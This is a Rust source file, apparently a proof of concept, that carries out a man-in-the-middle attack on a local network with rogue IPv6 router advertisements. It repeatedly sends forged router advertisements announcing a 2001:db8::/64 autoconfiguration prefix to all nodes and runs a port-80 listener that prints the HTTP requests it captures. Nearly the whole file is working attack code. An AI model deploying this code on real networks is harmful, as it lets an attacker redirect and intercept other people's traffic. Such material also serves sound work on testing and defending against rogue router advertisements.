// POC for MitM attack using "rogue" router advertisements
// Written by champetier.etienne@gmail.com, with lots of copy pastes from smoltcp codebase

#[macro_use]
extern crate log;
extern crate env_logger;
extern crate getopts;
extern crate mac_address;
extern crate smoltcp;

use env_logger::Builder;
use getopts::Options;
use log::{Level, LevelFilter};
use mac_address::mac_address_by_name;
use smoltcp::iface::{EthernetInterfaceBuilder, NeighborCache};
use smoltcp::phy::wait as phy_wait;
use smoltcp::phy::{Checksum, ChecksumCapabilities, Device, DeviceCapabilities, RawSocket};
use smoltcp::socket::{IcmpEndpoint, IcmpPacketMetadata, IcmpSocket, IcmpSocketBuffer, SocketSet};
use smoltcp::socket::{TcpSocket, TcpSocketBuffer};
use smoltcp::time::{Duration, Instant};
use smoltcp::wire::{EthernetAddress, IpAddress, IpCidr, Ipv6Address};
use smoltcp::wire::{
    Icmpv6Packet, Icmpv6Repr, NdiscPrefixInfoFlags, NdiscPrefixInformation, NdiscRepr,
    NdiscRouterFlags,
};
use std::cmp::min;
use std::collections::BTreeMap;
use std::env;
use std::fmt::Write as fmtwrite;
use std::io;
use std::io::Write;
use std::os::unix::io::{AsRawFd, RawFd};
use std::process;
use std::str;

fn print_usage(opts: Options) -> ! {
    let brief = format!("Usage: {} [OPTION]...", env::args().nth(0).unwrap());
    print!("{}", opts.usage(&brief));
    process::exit(1)
}

fn main() {
    setup_logging("");

    let mut opts = Options::new();
    opts.optflag("h", "help", "print this help menu");
    opts.reqopt("i", "interface", "the interface to talk on", "INTERFACE");

    let matches = match opts.parse(env::args().skip(1)) {
        Ok(m) => {
            if m.opt_present("h") {
                print_usage(opts)
            }
            m
        }
        Err(f) => {
            println!("{}", f);
            print_usage(opts)
        }
    };

    let interface = matches.opt_str("i").unwrap();
    let device = RawSocket2::new(&interface).unwrap();
    let fd = device.as_raw_fd();

    let neighbor_cache = NeighborCache::new(BTreeMap::new());

    let tcp1_rx_buffer = TcpSocketBuffer::new(vec![0; 1024]);
    let tcp1_tx_buffer = TcpSocketBuffer::new(vec![0; 1024]);
    let tcp1_socket = TcpSocket::new(tcp1_rx_buffer, tcp1_tx_buffer);

    let icmp_rx_buffer = IcmpSocketBuffer::new(vec![IcmpPacketMetadata::EMPTY], vec![0; 256]);
    let icmp_tx_buffer = IcmpSocketBuffer::new(vec![IcmpPacketMetadata::EMPTY], vec![0; 256]);
    let mut icmp_socket = IcmpSocket::new(icmp_rx_buffer, icmp_tx_buffer);
    // hop limit must be 255 for all the Neighbor discovery packets, see https://tools.ietf.org/html/rfc4861
    icmp_socket.set_hop_limit(Some(255));

    //let ethernet_addr = EthernetAddress([0x02, 0x00, 0x00, 0x00, 0x00, 0x01]);
    // use the local mac as we don't have CAP_NET_ADMIN to make the interface promiscuous
    let mac = mac_address_by_name(&interface).unwrap().unwrap().bytes();
    let ethernet_addr = EthernetAddress(mac);
    let ipv6_addr = IpAddress::v6(0xfe80, 0, 0, 0, 0, 0, 0, 1);
    let ipv6_net = Ipv6Address::new(0x2001, 0xdb8, 0, 0, 0, 0, 0, 0);
    let ipv6_all = IpAddress::v6(0xff02, 0, 0, 0, 0, 0, 0, 1);

    let ra_interval = Duration::from_secs(10);

    let ip_addrs = [
        //IpCidr::new(IpAddress::v4(192, 168, 69, 1), 24),
        IpCidr::new(ipv6_addr, 64),
        IpCidr::new(IpAddress::v6(0x2001, 0xdb8, 0, 0, 0, 0, 0, 1), 64),
    ];
    let mut iface = EthernetInterfaceBuilder::new(device)
        .ethernet_addr(ethernet_addr)
        .neighbor_cache(neighbor_cache)
        .ip_addrs(ip_addrs)
        .finalize();

    let mut sockets = SocketSet::new(vec![]);
    let tcp1_handle = sockets.add(tcp1_socket);
    let icmp_handle = sockets.add(icmp_socket);

    let mut send_at = Instant::from_millis(0);

    loop {
        let timestamp = Instant::now();
        let mut should_poll = false;
        match iface.poll(&mut sockets, timestamp) {
            Ok(_) => {}
            Err(e) => {
                debug!("poll error: {}", e);
            }
        }

        // tcp:80: http ok
        {
            let mut socket = sockets.get::<TcpSocket>(tcp1_handle);
            if !socket.is_open() {
                socket.listen(80).unwrap()
            }

            if socket.may_recv() {
                //consume the request
                debug!("tcp:80 recv");
                let data = socket
                    .recv(|data| (data.len(), str::from_utf8(data).unwrap_or("(invalid utf8)")))
                    .unwrap();
                print!("{}", data);
                if data.contains("\r\n\r\n") && socket.may_send() {
                    debug!("tcp:80 send");
                    write!(
                        socket,
                        "HTTP/1.0 200 OK\r\nConnection: close\r\nContent-Length: 3\r\n\r\nok\n"
                    )
                    .unwrap();
                    debug!("tcp:80 close");
                    socket.close();
                    should_poll = true;
                }
            } else if socket.may_send() {
                debug!("tcp:80 close2");
                socket.close();
                should_poll = true;
            }
        }

        // icmpv6 router advertisement
        {
            let mut socket = sockets.get::<IcmpSocket>(icmp_handle);
            if !socket.is_open() {
                socket.bind(IcmpEndpoint::Ident(0x2Ab)).unwrap();
                send_at = timestamp;
            }

            if socket.can_send() && send_at <= timestamp {
                let icmp_repr = Icmpv6Repr::Ndisc(NdiscRepr::RouterAdvert {
                    hop_limit: 64,
                    flags: NdiscRouterFlags::empty(),
                    router_lifetime: Duration::from_secs(30),
                    reachable_time: Duration::from_millis(0),
                    retrans_time: Duration::from_millis(0),
                    lladdr: Some(ethernet_addr),
                    mtu: None,
                    prefix_info: Some(NdiscPrefixInformation {
                        prefix_len: 64,
                        flags: NdiscPrefixInfoFlags::ADDRCONF,
                        valid_lifetime: Duration::from_secs(60),
                        preferred_lifetime: Duration::from_secs(30),
                        prefix: ipv6_net,
                    }),
                });

                let icmp_payload = socket.send(icmp_repr.buffer_len(), ipv6_all).unwrap();

                let mut icmp_packet = Icmpv6Packet::new_unchecked(icmp_payload);

                icmp_repr.emit(
                    &ipv6_addr,
                    &ipv6_all,
                    &mut icmp_packet,
                    &ChecksumCapabilities::default(),
                );

                send_at += ra_interval;

                should_poll = true;
            }
        }

        if should_poll {
            // we need to call poll() to send whta is in the Tx buffer,
            // but phy_wait(..,poll_at()) make us wait.
            // Not sure it's a bug or me just not using it right
            continue;
        }

        let max_wait;
        match iface.poll_at(&sockets, timestamp) {
            Some(pool_at) => max_wait = min(send_at, pool_at) - timestamp,
            _ => max_wait = send_at - timestamp,
        }
        phy_wait(fd, Some(max_wait)).expect("wait error")
    }
}

pub fn setup_logging_with_clock<F>(filter: &str, since_startup: F)
where
    F: Fn() -> Instant + Send + Sync + 'static,
{
    Builder::new()
        .format(move |buf, record| {
            let elapsed = since_startup();
            let timestamp = format!("[{}]", elapsed);
            if record.target().starts_with("smoltcp::") {
                writeln!(
                    buf,
                    "\x1b[0m{} ({}): {}\x1b[0m",
                    timestamp,
                    record.target().replace("smoltcp::", ""),
                    record.args()
                )
            } else if record.level() == Level::Trace {
                let message = format!("{}", record.args());
                writeln!(
                    buf,
                    "\x1b[37m{} {}\x1b[0m",
                    timestamp,
                    message.replace("\n", "\n             ")
                )
            } else {
                writeln!(
                    buf,
                    "\x1b[32m{} ({}): {}\x1b[0m",
                    timestamp,
                    record.target(),
                    record.args()
                )
            }
        })
        .filter(None, LevelFilter::Trace)
        .parse(filter)
        .parse(&env::var("RUST_LOG").unwrap_or("".to_owned()))
        .init();
}

pub fn setup_logging(filter: &str) {
    setup_logging_with_clock(filter, move || Instant::now())
}

// we just want to change RawSocket capabilities() to disable Rx checksums
// This is needed because on Linux local packets don't always have valid checksums
// to improve performance, and when using raw sockets this fact isn't hidden from us
// https://github.com/smoltcp-rs/smoltcp/issues/328
#[derive(Debug)]
pub struct RawSocket2 {
    inner: RawSocket,
}

impl AsRawFd for RawSocket2 {
    fn as_raw_fd(&self) -> RawFd {
        self.inner.as_raw_fd()
    }
}

impl RawSocket2 {
    pub fn new(name: &str) -> io::Result<RawSocket2> {
        Ok(RawSocket2 {
            inner: RawSocket::new(name)?,
        })
    }
}

impl<'a> Device<'a> for RawSocket2 {
    type RxToken = <RawSocket as Device<'a>>::RxToken;
    type TxToken = <RawSocket as Device<'a>>::TxToken;

    fn capabilities(&self) -> DeviceCapabilities {
        let mut checksum_caps = ChecksumCapabilities::default();
        checksum_caps.ipv4 = Checksum::Tx;
        checksum_caps.udp = Checksum::Tx;
        checksum_caps.tcp = Checksum::Tx;
        checksum_caps.icmpv4 = Checksum::Tx;
        checksum_caps.icmpv6 = Checksum::Tx;
        let mut c = self.inner.capabilities();
        c.checksum = checksum_caps;
        c
    }

    fn receive(&'a mut self) -> Option<(Self::RxToken, Self::TxToken)> {
        self.inner.receive()
    }

    fn transmit(&'a mut self) -> Option<Self::TxToken> {
        self.inner.transmit()
    }
}
